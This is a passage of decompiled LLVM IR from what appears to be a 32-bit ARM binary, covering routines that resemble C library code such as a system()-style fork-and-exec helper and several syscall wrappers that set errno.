  uselistorder i1 %v8_16f8c, { 1, 2, 0 }
  uselistorder i32 %v2_16f5c, { 1, 2, 0 }
  uselistorder i32 %v1_16f58, { 1, 2, 0 }
  uselistorder i1 %v2_16f44, { 1, 0 }
  uselistorder i32 %v4_16f28, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v3_16ec4, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 2, 4, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 4, 3, 0, 1, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 10, 6, 7, 8, 9, 11, 12, 1, 13, 14, 15, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 0, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_163f8, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 3, 2, 1 }
  uselistorder i32 32770, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @function_16dec, { 2, 1, 0 }
  uselistorder i32 120, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_17120, { 1, 0 }
  uselistorder label %dec_label_pc_170fc, { 1, 0 }
  uselistorder label %dec_label_pc_170c0.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1700c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16fe8, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_16f5c, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_16f44, { 1, 0 }
}

define i32 @function_17180(i32 %arg1) local_unnamed_addr {
dec_label_pc_17180:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17180 = load i32, i32* @r4, align 4
  %v0_1718c = load i32, i32* %r0.global-to-local, align 4
  %v2_1718c = icmp eq i32 %v0_1718c, 0
  br i1 %v2_1718c, label %bb, label %dec_label_pc_171a4

bb:                                               ; preds = %dec_label_pc_17180
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172c0

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17180
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_171ac = call i32 @function_14b30(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_171bc = call i32 @function_14b30(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_171cc = call i32 @function_14b30(i32 17, i32 0)
  store i32 %v2_171cc, i32* @r0, align 4
  %v0_171d4 = call i32 @function_12540()
  store i32 %v0_171d4, i32* %r0.global-to-local, align 4
  store i32 %v0_171d4, i32* @r4, align 4
  %v1_171d8 = icmp slt i32 %v0_171d4, 0
  br i1 %v1_171d8, label %dec_label_pc_171e0, label %dec_label_pc_1720c

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171a4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_171e8 = call i32 @function_14b30(i32 3, i32 %v2_171ac)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_171f4 = call i32 @function_14b30(i32 2, i32 %v2_171bc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17200 = call i32 @function_14b30(i32 17, i32 %v2_171cc)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172c0

dec_label_pc_1720c:                               ; preds = %dec_label_pc_171a4
  %v2_171d8 = icmp eq i32 %v0_171d4, 0
  br i1 %v2_171d8, label %dec_label_pc_17210, label %dec_label_pc_17264

dec_label_pc_17210:                               ; preds = %dec_label_pc_1720c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_17218 = call i32 @function_14b30(i32 3, i32 0)
  %v0_1721c = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17224 = call i32 @function_14b30(i32 2, i32 %v0_1721c)
  %v0_17228 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17230 = call i32 @function_14b30(i32 17, i32 %v0_17228)
  store i32 ptrtoint ([8 x i8]* @global_var_23938.934 to i32), i32* @r0, align 4
  %v0_17254 = load i32, i32* @r4, align 4
  %v8_17258 = call i32 @function_16c80(i32 ptrtoint ([8 x i8]* @global_var_23938.934 to i32), i32 ptrtoint ([3 x i8]* @global_var_23940.935 to i32), i32 ptrtoint ([3 x i8]* @global_var_23944.933 to i32), i32 %v0_1718c, i32 %v0_17254)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_17260 = call i32 @function_12a34(i32 127)
  store i32 %v1_17260, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17264

dec_label_pc_17264:                               ; preds = %dec_label_pc_1720c, %dec_label_pc_17210
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1726c = call i32 @function_14b30(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17278 = call i32 @function_14b30(i32 2, i32 1)
  %v2_17284 = ptrtoint i32* %stack_var_-12 to i32
  %v0_17288 = load i32, i32* @r4, align 4
  store i32 %v0_17288, i32* %r0.global-to-local, align 4
  %v2_1728c = call i32 @function_17404(i32 %v0_17288, i32 %v2_17284)
  store i32 %v2_1728c, i32* %r0.global-to-local, align 4
  %v7_17290 = icmp eq i32 %v2_1728c, -1
  br i1 %v7_17290, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_17264
  store i32 %v2_1728c, i32* %stack_var_-12, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_17264, %bb11
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_172a0 = call i32 @function_14b30(i32 3, i32 %v2_171ac)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_172ac = call i32 @function_14b30(i32 2, i32 %v2_171bc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_172b8 = call i32 @function_14b30(i32 17, i32 %v2_171cc)
  %v3_172bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_172bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172c0

dec_label_pc_172c0:                               ; preds = %bb, %dec_label_pc_171e0, %bb12
  %v1_172c8 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_171e0 ], [ %v3_172bc, %bb12 ]
  store i32 %v3_17180, i32* @r4, align 4
  ret i32 %v1_172c8

; uselistorder directives
  uselistorder i32 %v2_1728c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32)* @function_17404, { 1, 0 }
  uselistorder i32 (i32)* @function_12a34, { 2, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_16c80, { 1, 0 }
  uselistorder i32 ()* @function_12540, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_14b30, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_172c0, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_17264, { 1, 0 }
}

define i32 @function_172dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_172dc:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_172dc = load i32, i32* @r4, align 4
  store i32 %v3_172dc, i32* %stack_var_-16, align 4
  %v3_172e8 = urem i32 %arg3, 4096
  %v2_172ec = icmp eq i32 %v3_172e8, 0
  br i1 %v2_172ec, label %dec_label_pc_17308, label %dec_label_pc_172f4

dec_label_pc_172f4:                               ; preds = %dec_label_pc_172dc
  %v0_172f4 = call i32 @function_12b24()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17300 = inttoptr i32 %v0_172f4 to i32*
  store i32 22, i32* %v2_17300, align 4
  %v0_17338.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17338

dec_label_pc_17308:                               ; preds = %dec_label_pc_172dc
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17334, label %dec_label_pc_17324

dec_label_pc_17324:                               ; preds = %dec_label_pc_17308
  %v0_17324 = call i32 @function_12b24()
  %v0_17328 = load i32, i32* %r4.global-to-local, align 4
  %v1_17328 = sub i32 0, %v0_17328
  %v2_1732c = inttoptr i32 %v0_17324 to i32*
  store i32 %v1_17328, i32* %v2_1732c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17334

dec_label_pc_17334:                               ; preds = %dec_label_pc_17308, %dec_label_pc_17324
  %v0_17334 = phi i32 [ %arg1, %dec_label_pc_17308 ], [ -1, %dec_label_pc_17324 ]
  store i32 %v0_17334, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17338

dec_label_pc_17338:                               ; preds = %dec_label_pc_172f4, %dec_label_pc_17334
  %v0_17338 = phi i32 [ %v0_17338.pre, %dec_label_pc_172f4 ], [ %v0_17334, %dec_label_pc_17334 ]
  %v2_1733c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1733c, i32* @r4, align 4
  ret i32 %v0_17338

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17338, { 1, 0 }
  uselistorder label %dec_label_pc_17334, { 1, 0 }
}

define i32 @function_17344() local_unnamed_addr {
dec_label_pc_17344:
  %stack_var_-8 = alloca i32, align 4
  %v3_17344 = load i32, i32* @r4, align 4
  store i32 %v3_17344, i32* %stack_var_-8, align 4
  %v0_17348 = load i32, i32* @r0, align 4
  %v0_1734c = call i32 @function_12b24()
  %v1_17350 = sub i32 0, %v0_17348
  %v2_17354 = inttoptr i32 %v0_1734c to i32*
  store i32 %v1_17350, i32* %v2_17354, align 4
  %v2_1735c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1735c, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_17364(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17364:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17364 = load i32, i32* @r4, align 4
  %v6_17364 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1736c = icmp eq i32 %arg2, 0
  store i32 180260, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1736c, label %dec_label_pc_173c0, label %dec_label_pc_17384

dec_label_pc_17384:                               ; preds = %dec_label_pc_17364
  %v1_17384 = add i32 %arg2, 4
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  %v3_17384 = load i32, i32* %v2_17384, align 4
  store i32 %v3_17384, i32* @r3, align 4
  %v1_17388 = and i32 %v3_17384, 67108864
  %v2_17388 = icmp eq i32 %v1_17388, 0
  br i1 %v2_17388, label %dec_label_pc_17390, label %dec_label_pc_173c0

dec_label_pc_17390:                               ; preds = %dec_label_pc_17384
  store i32 20, i32* @r2, align 4
  %v2_17394 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_17394, i32* @r0, align 4
  %v0_17398 = call i32 @function_14000()
  store i32 %v2_17394, i32* @ip, align 4
  %v0_173c0.pre = load i32, i32* @r5, align 4
  %v0_173c8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_173c0

dec_label_pc_173c0:                               ; preds = %dec_label_pc_17384, %dec_label_pc_17364, %dec_label_pc_17390
  %v0_173c8 = phi i32 [ %arg3, %dec_label_pc_17384 ], [ %arg3, %dec_label_pc_17364 ], [ %v0_173c8.pre, %dec_label_pc_17390 ]
  %v0_173c4 = phi i32 [ %arg2, %dec_label_pc_17384 ], [ 0, %dec_label_pc_17364 ], [ %v2_17394, %dec_label_pc_17390 ]
  %v0_173c0 = phi i32 [ %arg1, %dec_label_pc_17384 ], [ %arg1, %dec_label_pc_17364 ], [ %v0_173c0.pre, %dec_label_pc_17390 ]
  %v4_173d0 = call i32 @function_1760c(i32 %v0_173c0, i32 %v0_173c4, i32 %v0_173c8, i32 8)
  store i32 %v3_17364, i32* @r4, align 4
  store i32 %v6_17364, i32* @r5, align 4
  ret i32 %v4_173d0

; uselistorder directives
  uselistorder label %dec_label_pc_173c0, { 2, 0, 1 }
}

define i32 @function_173e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_173e4:
  %v0_173e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_173e4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_173e4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_173e4, %bb
  %v0_173f8 = phi i32 [ %arg1, %dec_label_pc_173e4 ], [ 0, %bb ]
  ret i32 %v0_173f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17404(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17404:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17404 = load i32, i32* @r7, align 4
  store i32 %v3_17404, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1742c, label %dec_label_pc_1741c

dec_label_pc_1741c:                               ; preds = %dec_label_pc_17404
  %v0_1741c = call i32 @function_12b24()
  %v0_17420 = load i32, i32* %r7.global-to-local, align 4
  %v1_17420 = sub i32 0, %v0_17420
  %v2_17424 = inttoptr i32 %v0_1741c to i32*
  store i32 %v1_17420, i32* %v2_17424, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17430.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1742c

dec_label_pc_1742c:                               ; preds = %dec_label_pc_17404, %dec_label_pc_1741c
  %v2_17430 = phi i32 [ %v3_17404, %dec_label_pc_17404 ], [ %v2_17430.pre, %dec_label_pc_1741c ]
  %v0_1742c = phi i32 [ %arg1, %dec_label_pc_17404 ], [ -1, %dec_label_pc_1741c ]
  store i32 %v2_17430, i32* @r7, align 4
  ret i32 %v0_1742c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1742c, { 1, 0 }
}

define i32 @function_17438() local_unnamed_addr {
dec_label_pc_17438:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17438 = load i32, i32* @r7, align 4
  store i32 %v3_17438, i32* %stack_var_-8, align 4
  %v0_17444 = load i32, i32* @r0, align 4
  store i32 %v0_17444, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17444, -4095
  br i1 %tmp, label %dec_label_pc_17464, label %dec_label_pc_17454

dec_label_pc_17454:                               ; preds = %dec_label_pc_17438
  %v0_17454 = call i32 @function_12b24()
  %v0_17458 = load i32, i32* %r7.global-to-local, align 4
  %v1_17458 = sub i32 0, %v0_17458
  %v2_1745c = inttoptr i32 %v0_17454 to i32*
  store i32 %v1_17458, i32* %v2_1745c, align 4
  %v2_17464.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17464

dec_label_pc_17464:                               ; preds = %dec_label_pc_17438, %dec_label_pc_17454
  %v1_17468 = phi i32 [ %v0_17444, %dec_label_pc_17438 ], [ -1, %dec_label_pc_17454 ]
  %v2_17464 = phi i32 [ %v3_17438, %dec_label_pc_17438 ], [ %v2_17464.pre, %dec_label_pc_17454 ]
  store i32 %v2_17464, i32* %r7.global-to-local, align 4
  ret i32 %v1_17468

; uselistorder directives
  uselistorder i32 %v0_17444, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17464, { 1, 0 }
}

define i32 @function_1746c() local_unnamed_addr {
dec_label_pc_1746c:
  %v4_17478 = load i32, i32* inttoptr (i32 180360 to i32*), align 8
  %v1_1747c = inttoptr i32 %v4_17478 to i32*
  %v2_1747c = load i32, i32* %v1_1747c, align 4
  %v2_17480 = icmp eq i32 %v2_1747c, 0
  br i1 %v2_17480, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_1746c
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_1746c, %bb
  %v1_17488 = phi i32 [ %v2_1747c, %dec_label_pc_1746c ], [ 4096, %bb ]
  ret i32 %v1_17488

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_17494() local_unnamed_addr {
dec_label_pc_17494:
  %v1_174a4 = load i32, i32* @r0, align 4
  ret i32 %v1_174a4
}

define i32 @function_174a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_174a8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_174a8 = load i32, i32* @r7, align 4
  store i32 %v3_174a8, i32* %stack_var_-8, align 4
  %v0_174b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_174b4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_174b4, -4095
  br i1 %tmp, label %dec_label_pc_174d4, label %dec_label_pc_174c4

dec_label_pc_174c4:                               ; preds = %dec_label_pc_174a8
  %v0_174c4 = call i32 @function_12b24()
  %v0_174c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_174c8 = sub i32 0, %v0_174c8
  %v2_174cc = inttoptr i32 %v0_174c4 to i32*
  store i32 %v1_174c8, i32* %v2_174cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_174d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174a8, %dec_label_pc_174c4
  %v1_174d8 = phi i32 [ %v0_174b4, %dec_label_pc_174a8 ], [ -1, %dec_label_pc_174c4 ]
  %v2_174d4 = phi i32 [ %v3_174a8, %dec_label_pc_174a8 ], [ %v2_174d4.pre, %dec_label_pc_174c4 ]
  store i32 %v2_174d4, i32* %r7.global-to-local, align 4
  ret i32 %v1_174d8

; uselistorder directives
  uselistorder i32 %v0_174b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174d4, { 1, 0 }
}

define i32 @function_174dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_174dc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_174dc = load i32, i32* @r7, align 4
  store i32 %v3_174dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17504, label %dec_label_pc_174f4

dec_label_pc_174f4:                               ; preds = %dec_label_pc_174dc
  %v0_174f4 = call i32 @function_12b24()
  %v0_174f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_174f8 = sub i32 0, %v0_174f8
  %v2_174fc = inttoptr i32 %v0_174f4 to i32*
  store i32 %v1_174f8, i32* %v2_174fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17508.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17504

dec_label_pc_17504:                               ; preds = %dec_label_pc_174dc, %dec_label_pc_174f4
  %v2_17508 = phi i32 [ %v3_174dc, %dec_label_pc_174dc ], [ %v2_17508.pre, %dec_label_pc_174f4 ]
  %v0_17504 = phi i32 [ %arg1, %dec_label_pc_174dc ], [ -1, %dec_label_pc_174f4 ]
  store i32 %v2_17508, i32* @r7, align 4
  ret i32 %v0_17504

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17504, { 1, 0 }
}

define i32 @function_17510() local_unnamed_addr {
dec_label_pc_17510:
  %v1_17520 = load i32, i32* @r0, align 4
  ret i32 %v1_17520
}

define i32 @function_17524(i32 %arg1) local_unnamed_addr {
dec_label_pc_17524:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17524 = load i32, i32* @r4, align 4
  store i32 %v3_17524, i32* %stack_var_-16, align 4
  store i32 180260, i32* %r4.global-to-local, align 4
  %v4_17534 = load i32, i32* @global_var_32ac8.943, align 4
  %v2_17538 = icmp eq i32 %v4_17534, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17538, label %dec_label_pc_17544, label %dec_label_pc_17554

dec_label_pc_17544:                               ; preds = %dec_label_pc_17524
  %v1_17548 = call i32 @function_1ab30(i32 0)
  %v1_1754c = icmp slt i32 %v1_17548, 0
  br i1 %v1_1754c, label %dec_label_pc_17578, label %dec_label_pc_17554thread-pre-split

dec_label_pc_17554thread-pre-split:               ; preds = %dec_label_pc_17544
  %v0_17558.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_17554.pre = load i32, i32* @global_var_32ac8.943, align 4
  br label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %dec_label_pc_17554thread-pre-split, %dec_label_pc_17524
  %v0_17564 = phi i32 [ %v4_17554.pre, %dec_label_pc_17554thread-pre-split ], [ %v4_17534, %dec_label_pc_17524 ]
  %v1_17568 = phi i32 [ %v0_17558.pr, %dec_label_pc_17554thread-pre-split ], [ %arg1, %dec_label_pc_17524 ]
  %v2_17558 = icmp eq i32 %v1_17568, 0
  store i32 %v0_17564, i32* %r4.global-to-local, align 4
  br i1 %v2_17558, label %dec_label_pc_1757c, label %dec_label_pc_17564

dec_label_pc_17564:                               ; preds = %dec_label_pc_17554
  %v2_17568 = add i32 %v1_17568, %v0_17564
  %v1_1756c = call i32 @function_1ab30(i32 %v2_17568)
  %v1_17570 = icmp slt i32 %v1_1756c, 0
  br i1 %v1_17570, label %dec_label_pc_17578, label %dec_label_pc_17564.dec_label_pc_1757c_crit_edge

dec_label_pc_17564.dec_label_pc_1757c_crit_edge:  ; preds = %dec_label_pc_17564
  %v0_1757c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1757c

dec_label_pc_17578:                               ; preds = %dec_label_pc_17564, %dec_label_pc_17544
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %dec_label_pc_17554, %dec_label_pc_17564.dec_label_pc_1757c_crit_edge, %dec_label_pc_17578
  %v0_1757c = phi i32 [ %v0_1757c.pre, %dec_label_pc_17564.dec_label_pc_1757c_crit_edge ], [ -1, %dec_label_pc_17578 ], [ %v0_17564, %dec_label_pc_17554 ]
  %v2_17580 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17580, i32* @r4, align 4
  ret i32 %v0_1757c

; uselistorder directives
  uselistorder i32 %v0_17564, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1ab30, { 1, 0 }
  uselistorder label %dec_label_pc_1757c, { 2, 1, 0 }
}

define i32 @function_17590(i32 %arg1) local_unnamed_addr {
dec_label_pc_17590:
  %v1_175a0 = load i32, i32* @r0, align 4
  ret i32 %v1_175a0
}

define i32 @function_175a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_175a4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_175a4 = load i32, i32* @r7, align 4
  store i32 %v3_175a4, i32* %stack_var_-8, align 4
  %v0_175b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_175b0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_175b0, -4095
  br i1 %tmp, label %dec_label_pc_175d0, label %dec_label_pc_175c0

dec_label_pc_175c0:                               ; preds = %dec_label_pc_175a4
  %v0_175c0 = call i32 @function_12b24()
  %v0_175c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_175c4 = sub i32 0, %v0_175c4
  %v2_175c8 = inttoptr i32 %v0_175c0 to i32*
  store i32 %v1_175c4, i32* %v2_175c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_175d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_175d0

dec_label_pc_175d0:                               ; preds = %dec_label_pc_175a4, %dec_label_pc_175c0
  %v1_175d4 = phi i32 [ %v0_175b0, %dec_label_pc_175a4 ], [ -1, %dec_label_pc_175c0 ]
  %v2_175d0 = phi i32 [ %v3_175a4, %dec_label_pc_175a4 ], [ %v2_175d0.pre, %dec_label_pc_175c0 ]
  store i32 %v2_175d0, i32* @r7, align 4
  ret i32 %v1_175d4

; uselistorder directives
  uselistorder i32 %v0_175b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_175d0, { 1, 0 }
}

define i32 @function_175d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_175d8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_175d8 = load i32, i32* @r7, align 4
  store i32 %v3_175d8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17600, label %dec_label_pc_175f0

dec_label_pc_175f0:                               ; preds = %dec_label_pc_175d8
  %v0_175f0 = call i32 @function_12b24()
  %v0_175f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_175f4 = sub i32 0, %v0_175f4
  %v2_175f8 = inttoptr i32 %v0_175f0 to i32*
  store i32 %v1_175f4, i32* %v2_175f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17604.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17600

dec_label_pc_17600:                               ; preds = %dec_label_pc_175d8, %dec_label_pc_175f0
  %v2_17604 = phi i32 [ %v3_175d8, %dec_label_pc_175d8 ], [ %v2_17604.pre, %dec_label_pc_175f0 ]
  %v0_17600 = phi i32 [ %arg1, %dec_label_pc_175d8 ], [ -1, %dec_label_pc_175f0 ]
  store i32 %v2_17604, i32* @r7, align 4
  ret i32 %v0_17600

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17600, { 1, 0 }
}

define i32 @function_1760c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1760c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1760c = load i32, i32* @r7, align 4
  store i32 %v3_1760c, i32* %stack_var_-8, align 4
  %v0_17618 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17618, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17618, -4095
  br i1 %tmp, label %dec_label_pc_17638, label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_1760c
  %v0_17628 = call i32 @function_12b24()
  %v0_1762c = load i32, i32* %r7.global-to-local, align 4
  %v1_1762c = sub i32 0, %v0_1762c
  %v2_17630 = inttoptr i32 %v0_17628 to i32*
  store i32 %v1_1762c, i32* %v2_17630, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17638.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17638

dec_label_pc_17638:                               ; preds = %dec_label_pc_1760c, %dec_label_pc_17628
  %v1_1763c = phi i32 [ %v0_17618, %dec_label_pc_1760c ], [ -1, %dec_label_pc_17628 ]
  %v2_17638 = phi i32 [ %v3_1760c, %dec_label_pc_1760c ], [ %v2_17638.pre, %dec_label_pc_17628 ]
  store i32 %v2_17638, i32* @r7, align 4
  ret i32 %v1_1763c

; uselistorder directives
  uselistorder i32 %v0_17618, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17638, { 1, 0 }
}

define i32 @function_17640(i32* %arg1) local_unnamed_addr {
dec_label_pc_17640:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_17640 = load i32, i32* @r4, align 4
  store i32 %v3_17640, i32* %stack_var_-24, align 4
  %v2_17644 = load i32, i32* %arg1, align 4
